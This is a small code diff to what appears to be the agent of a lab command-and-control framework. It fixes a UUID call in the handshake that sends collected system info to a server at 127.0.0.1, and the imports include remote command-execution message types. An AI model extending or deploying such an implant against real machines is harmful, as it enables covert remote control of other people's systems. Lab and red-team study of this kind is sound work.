@@ -1,11 +1,11 @@
 
 import socket
 import time
+import uuid as _uuid
 from c2.server.transport import send_message, recv_message
 from c2.agent.protocol import make_handshake
 from c2.agent.sysinfo import collect
 from c2.server.protocol import TYPE_EXEC, TYPE_EXEC_RESULT
-
 
 SERVER_HOST = "127.0.0.1"  # change for your lab
 SERVER_PORT = 9001
@@ -22,7 +22,7 @@ def connect_loop():
             # handshake
             info = collect()
             payload = {
-                "id": str(_id.id4()),
+                "uuid": str(_uuid.uuid4()),
                 **info
             }
             send_message(s, make_handshake(payload))
